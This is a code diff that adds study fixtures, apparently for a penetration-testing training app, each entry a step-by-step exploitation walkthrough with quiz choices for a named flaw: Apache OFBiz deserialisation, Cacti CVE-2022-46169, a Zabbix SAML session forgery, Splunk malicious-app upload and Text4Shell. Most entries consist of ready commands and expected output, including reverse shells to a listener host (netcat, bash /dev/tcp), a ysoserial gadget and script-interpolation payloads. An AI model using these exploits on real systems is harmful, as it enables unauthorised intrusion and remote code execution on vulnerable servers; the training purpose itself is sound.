@@ -7569,6 +7569,471 @@
         "content-discovery": "You already know the service and version; exploit the known CVE.",
         "recon-web-triage": "General triage is done; the version is in the vulnerable range, so take the shell."
       }
+    },
+    "ofbiz-deser": {
+      "why": "Apache OFBiz is a Java business suite, and before version 17.12.04 its XML-RPC endpoint deserialises whatever you send it without authentication. Deserialising attacker data in Java means a gadget chain, a sequence of library calls that ends in a command, runs on the server. Because it is Java, the same payload works on Linux or Windows. The skill is confirming the product and version from the webtools page, building the gadget with ysoserial, and posting it to the xmlrpc path.",
+      "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+      "tool": "curl",
+      "output": "<title>OFBiz: Web Tools</title>",
+      "signal": "OFBiz",
+      "teach": "OFBiz is present on 8443. If the version is below 17.12.04, the xmlrpc endpoint deserialises your gadget with no login. Build a CommonsBeanutils chain carrying your command and POST it.",
+      "leadup": [
+        {
+          "key": "fingerprint",
+          "label": "The app is OFBiz",
+          "steps": [
+            {
+              "title": "Banner the webtools page",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+              "out": "<title>OFBiz: Web Tools</title>",
+              "sig": "OFBiz",
+              "teach": "The webtools page names OFBiz; the version footer tells you whether it is below 17.12.04."
+            }
+          ]
+        },
+        {
+          "key": "endpoint",
+          "label": "The xmlrpc endpoint answers",
+          "steps": [
+            {
+              "title": "Check the deserialising endpoint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk -o /dev/null -w \"%{http_code}\\n\" https://{{target}}:8443/webtools/control/xmlrpc",
+              "out": "200",
+              "sig": "200",
+              "teach": "The vulnerable endpoint is /webtools/control/xmlrpc; a 200 means it is reachable without a login."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "OFBiz deser is confirm the version, build a ysoserial gadget with your command, then POST it to the xmlrpc endpoint.",
+        "items": [
+          {
+            "t": "Confirm the product and version",
+            "d": "The webtools page or the login footer shows the version; below 17.12.04 is vulnerable.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
+                "out": "<title>OFBiz: Web Tools</title>",
+                "sig": "OFBiz"
+              }
+            ],
+            "note": "A patched OFBiz removes the unsafe deserialisation; the version is the gate."
+          },
+          {
+            "t": "Build the gadget",
+            "d": "ysoserial produces a CommonsBeanutils chain that ends in your command.",
+            "demo": [
+              {
+                "run": "java -jar ysoserial.jar CommonsBeanutils1 'nc {{lhost}} 4444 -e /bin/sh' > payload.bin",
+                "out": "(payload.bin written)",
+                "sig": "payload.bin"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the gadget carries that command."
+          },
+          {
+            "t": "POST it to xmlrpc",
+            "d": "Wrap the gadget in the XML-RPC methodResponse and POST it to the unauthenticated endpoint.",
+            "demo": [
+              {
+                "run": "curl -sk -X POST https://{{target}}:8443/webtools/control/xmlrpc -H 'Content-Type: application/xml' --data @payload.xml",
+                "out": "(no useful body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "The endpoint deserialises the gadget and your command runs as the OFBiz user."
+          }
+        ]
+      },
+      "situation": "A Java app on 8443 banners as OFBiz, and /webtools/control/xmlrpc returns 200. What is the move?",
+      "choices": [
+        "ofbiz-deser",
+        "check-log4shell",
+        "content-discovery",
+        "sqli-basics"
+      ],
+      "coach": {
+        "check-log4shell": "Different bug; OFBiz has its own unauthenticated deserialiser on the xmlrpc endpoint.",
+        "content-discovery": "You already found the vulnerable endpoint; build and post the gadget.",
+        "sqli-basics": "No SQL parameter here; the flaw is Java deserialization, so use a gadget chain."
+      }
+    },
+    "cacti-cmdinjection": {
+      "why": "Cacti is a network-graphing app, and version 1.2.22 and below has an unauthenticated command injection in remote_agent.php. The script authorises callers by their client address, but that check trusts the X-Forwarded-For header, which you set yourself, so you spoof an authorised poller and a parameter flows into a shell. Confirm the version from the CHANGELOG, then a public script sends the spoofed header and your command. It is a reliable unauthenticated shell as the web user on an old Cacti.",
+      "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+      "tool": "curl",
+      "output": "1.2.22\n\nThe following changes are in the 1.2.22 release",
+      "signal": "1.2.22",
+      "teach": "Cacti 1.2.22 is vulnerable. remote_agent.php trusts X-Forwarded-For, so spoof an authorised poller address and inject a command through the poller parameter.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The version is 1.2.22 or below",
+          "steps": [
+            {
+              "title": "Read the CHANGELOG",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+              "out": "1.2.22",
+              "sig": "1.2.22",
+              "teach": "1.2.22 and below carry the remote_agent.php injection."
+            }
+          ]
+        },
+        {
+          "key": "endpoint",
+          "label": "remote_agent.php is reachable",
+          "steps": [
+            {
+              "title": "Check the injectable script",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/cacti/remote_agent.php",
+              "out": "200",
+              "sig": "200",
+              "teach": "remote_agent.php is the injectable endpoint and it answers without a login."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Cacti injection is confirm 1.2.22 or below, then fire the public script that spoofs X-Forwarded-For and injects your command.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The CHANGELOG names the version; 1.2.22 and below are vulnerable.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
+                "out": "1.2.22",
+                "sig": "1.2.22"
+              }
+            ],
+            "note": "A newer Cacti fixed the address check."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command is a reverse shell, so have the listener ready.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "The shell lands as the web user."
+          },
+          {
+            "t": "Fire the injection",
+            "d": "The public script spoofs X-Forwarded-For to an authorised poller and injects the command.",
+            "demo": [
+              {
+                "run": "python3 CVE-2022-46169.py -u http://{{target}}/cacti -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'",
+                "out": "[+] Triggering reverse shell",
+                "sig": "Triggering reverse shell"
+              }
+            ],
+            "note": "Catch the shell, then enumerate the host for privilege escalation."
+          }
+        ]
+      },
+      "situation": "Cacti's CHANGELOG shows version 1.2.22 and remote_agent.php is reachable. What is the move?",
+      "choices": [
+        "cacti-cmdinjection",
+        "command-injection",
+        "content-discovery",
+        "online-brute-ftp"
+      ],
+      "coach": {
+        "command-injection": "This is the specific remote_agent.php CVE with an X-Forwarded-For spoof precondition, not a generic app input.",
+        "content-discovery": "The endpoint and version are known; fire the exploit.",
+        "online-brute-ftp": "Wrong service entirely; the shell is through the Cacti web app."
+      }
+    },
+    "zabbix-script-rce": {
+      "why": "Zabbix is a monitoring platform whose frontend, when SAML single sign-on is enabled, trusts an unsigned session cookie, so you can forge an Admin session with no password. That matters because Zabbix has a built-in Scripts feature that runs operating-system commands on the server or on the agents it monitors, by design. So an admin takeover becomes code execution. Confirm the frontend and SSO, forge the cookie to land as Admin, then add a script that is a reverse shell and run it on a host.",
+      "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+      "tool": "curl",
+      "output": "<title>Zabbix SIA</title>",
+      "signal": "Zabbix",
+      "teach": "The Zabbix frontend is present. If SAML SSO is enabled, forge the unsigned session cookie for Admin, then use Administration Scripts to run a reverse shell on a monitored host.",
+      "leadup": [
+        {
+          "key": "frontend",
+          "label": "The Zabbix frontend is up",
+          "steps": [
+            {
+              "title": "Confirm the frontend",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+              "out": "<title>Zabbix SIA</title>",
+              "sig": "Zabbix",
+              "teach": "The frontend is the attack surface; next check whether SSO is enabled."
+            }
+          ]
+        },
+        {
+          "key": "sso",
+          "label": "SAML SSO is enabled",
+          "steps": [
+            {
+              "title": "Look for the SSO entry point",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://{{target}}/zabbix/index_sso.php",
+              "out": "200",
+              "sig": "200",
+              "teach": "An SSO login page present means the unsigned-cookie forgery applies."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Zabbix RCE is confirm SSO, forge the Admin cookie, then add and run a Scripts entry that is a reverse shell.",
+        "items": [
+          {
+            "t": "Confirm the frontend and SSO",
+            "d": "The forgery needs SAML SSO; a present SSO login page is the precondition.",
+            "demo": [
+              {
+                "run": "curl -s http://{{target}}/zabbix/index.php | grep -i zabbix",
+                "out": "<title>Zabbix SIA</title>",
+                "sig": "Zabbix"
+              }
+            ],
+            "note": "Without SSO this path does not apply; look for default credentials instead."
+          },
+          {
+            "t": "Forge the Admin session",
+            "d": "A public PoC crafts the unsigned zbx_session cookie for Admin, so the dashboard loads with no password.",
+            "demo": [
+              {
+                "run": "python3 zabbix-saml-bypass.py -u http://{{target}}/zabbix",
+                "out": "[+] Forged session for Admin",
+                "sig": "Forged session for Admin"
+              }
+            ],
+            "note": "You are now Admin in the frontend, with the Scripts feature available."
+          },
+          {
+            "t": "Run a Script on a host",
+            "d": "Administration Scripts runs OS commands on the server or agents; add one that is a reverse shell and execute it.",
+            "demo": [
+              {
+                "run": "# Administration > Scripts: new script 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1', then run it on a monitored host",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the Zabbix server or agent user."
+          }
+        ]
+      },
+      "situation": "The Zabbix frontend is reachable and its SAML SSO login page is present. What is the move?",
+      "choices": [
+        "zabbix-script-rce",
+        "sqli-basics",
+        "content-discovery",
+        "online-brute-ssh"
+      ],
+      "coach": {
+        "sqli-basics": "The path is an auth bypass plus the built-in Scripts feature, not a SQL parameter.",
+        "content-discovery": "The app and SSO are already identified; forge the cookie and use Scripts.",
+        "online-brute-ssh": "Wrong service; the RCE is through the Zabbix web frontend."
+      }
+    },
+    "splunk-app-rce": {
+      "why": "Splunk runs the scripts that ship inside an installed app as its own service user, which means anyone who can install an app can run code. You package a tiny app whose scripted input is a reverse shell, upload it through the web UI or the REST API, and Splunk fires it. Uploading normally needs a login, though on 9.0.x and 9.1.x CVE-2023-46214 opens a lower-privilege route to the same result. Confirm the version on the management port, build the app, and upload it.",
+      "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+      "tool": "curl",
+      "output": "<version>9.1.0</version>",
+      "signal": "9.1.0",
+      "teach": "Splunk 9.1.0 is reachable on the management port. Package an app whose scripted input is a reverse shell and upload it; Splunk runs it as the splunk user.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The Splunk version is known",
+          "steps": [
+            {
+              "title": "Read the version from the REST API",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+              "out": "<version>9.1.0</version>",
+              "sig": "9.1.0",
+              "teach": "9.0.x and 9.1.x also carry the lower-privilege CVE-2023-46214 path."
+            }
+          ]
+        },
+        {
+          "key": "mgmt",
+          "label": "The management port answers",
+          "steps": [
+            {
+              "title": "Confirm Splunkd",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p8089 -sV {{target}}",
+              "out": "8089/tcp open  ssl/http Splunkd httpd",
+              "sig": "8089/tcp open",
+              "teach": "8089 is Splunkd and 8000 is the web UI; either can accept an app upload with the right access."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Splunk app RCE is confirm the version, build an app with a scripted-input reverse shell, upload it, and catch the splunk-user shell.",
+        "items": [
+          {
+            "t": "Confirm the version",
+            "d": "The management REST endpoint reports the version without a login.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:8089/services/server/info | grep -i version",
+                "out": "<version>9.1.0</version>",
+                "sig": "9.1.0"
+              }
+            ],
+            "note": "9.0.x and 9.1.x also expose the lower-privilege CVE-2023-46214 path."
+          },
+          {
+            "t": "Build the malicious app",
+            "d": "A small app with a scripted input that calls back is all you need; edit the host and port, then package it.",
+            "demo": [
+              {
+                "run": "git clone https://github.com/0xjpuff/reverse_shell_splunk && tar czf rev.tar.gz reverse_shell_splunk",
+                "out": "reverse_shell_splunk/bin/rev.py",
+                "sig": "reverse_shell_splunk"
+              }
+            ],
+            "note": "Set the LHOST and LPORT in the app's script before packaging."
+          },
+          {
+            "t": "Upload and catch the shell",
+            "d": "Install the app through Manage Apps or the REST apps endpoint; Splunk runs its scripted input.",
+            "demo": [
+              {
+                "run": "# Manage Apps > Install app from file > rev.tar.gz (or the REST apps/local endpoint)",
+                "out": "(app installed; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the scripted input runs as the splunk user."
+          }
+        ]
+      },
+      "situation": "Splunkd answers on 8089 and reports version 9.1.0, and you can reach Manage Apps. What is the move?",
+      "choices": [
+        "splunk-app-rce",
+        "content-discovery",
+        "online-brute-ssh",
+        "sqli-basics"
+      ],
+      "coach": {
+        "content-discovery": "The service and upload path are known; package and install the app.",
+        "online-brute-ssh": "Wrong service; the code execution is through a Splunk app, not SSH.",
+        "sqli-basics": "No database input; Splunk runs your app's bundled script directly."
+      }
+    },
+    "text4shell": {
+      "why": "Apache Commons Text is a Java string library, and versions 1.5 through 1.9 evaluate interpolations inside its StringSubstitutor, including ones that run a script, fetch a URL, or resolve DNS. If a web app passes a request parameter through that substitutor, your interpolation runs on the server, which is remote code execution. The work is finding the reflected parameter, often a search box, confirming it evaluates with an out-of-band callback, then swapping in a reverse shell. URL-encode the payload so special characters survive the request.",
+      "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+      "tool": "curl",
+      "output": "(no body; a request hits your listener at /hit)",
+      "signal": "/hit",
+      "teach": "A callback to your box from the url interpolation proves the parameter reaches a vulnerable Commons Text. Swap it for a script interpolation to run a command, then a reverse shell.",
+      "leadup": [
+        {
+          "key": "param",
+          "label": "A reflected parameter exists",
+          "steps": [
+            {
+              "title": "Find a parameter the app processes",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
+              "out": "Results for: test",
+              "sig": "Results for: test",
+              "teach": "Any parameter whose value is handled server-side, like a search box, is the candidate to test."
+            }
+          ]
+        },
+        {
+          "key": "callback",
+          "label": "The interpolation evaluates",
+          "steps": [
+            {
+              "title": "Send an out-of-band url payload",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+              "out": "(no body; a request hits your listener at /hit)",
+              "sig": "/hit",
+              "teach": "A hit on your listener means the parameter flows into the vulnerable substitutor."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Text4Shell is find the reflected parameter, confirm with an out-of-band url interpolation, then run a command with a script interpolation.",
+        "items": [
+          {
+            "t": "Find a reflected parameter",
+            "d": "Probe parameters whose value the app processes; a search box is the usual one.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=test'",
+                "out": "Results for: test",
+                "sig": "Results for: test"
+              }
+            ],
+            "note": "You are looking for input that reaches server-side string handling."
+          },
+          {
+            "t": "Confirm with an out-of-band callback",
+            "d": "A url interpolation makes the server fetch your box, which proves evaluation without needing the response.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${url:UTF-8:http://{{lhost}}/hit}'",
+                "out": "(no body; a request hits your listener at /hit)",
+                "sig": "/hit"
+              }
+            ],
+            "note": "Run a listener on {{lhost}} first; a hit confirms the interpolation runs."
+          },
+          {
+            "t": "Run a command, then a shell",
+            "d": "Switch to a script interpolation to execute a command, confirm with id, then stage a reverse shell.",
+            "demo": [
+              {
+                "run": "curl -sG 'http://{{target}}:8080/search' --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}'",
+                "out": "uid=1000(app) gid=1000(app)",
+                "sig": "uid=1000(app)"
+              }
+            ],
+            "note": "With execution confirmed, stage a reverse shell the same way."
+          }
+        ]
+      },
+      "situation": "A search parameter on a Java app triggers an out-of-band HTTP callback when you send a url interpolation payload. What is the move?",
+      "choices": [
+        "text4shell",
+        "ssti",
+        "command-injection",
+        "check-log4shell"
+      ],
+      "coach": {
+        "ssti": "Close in spirit, but this is specifically Commons Text interpolation, confirmed by the url callback.",
+        "command-injection": "The injection is into a Java interpolation layer, not a shell metacharacter in app input.",
+        "check-log4shell": "Log4Shell is JNDI in Log4j; these interpolations are Commons Text, a different library."
+      }
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
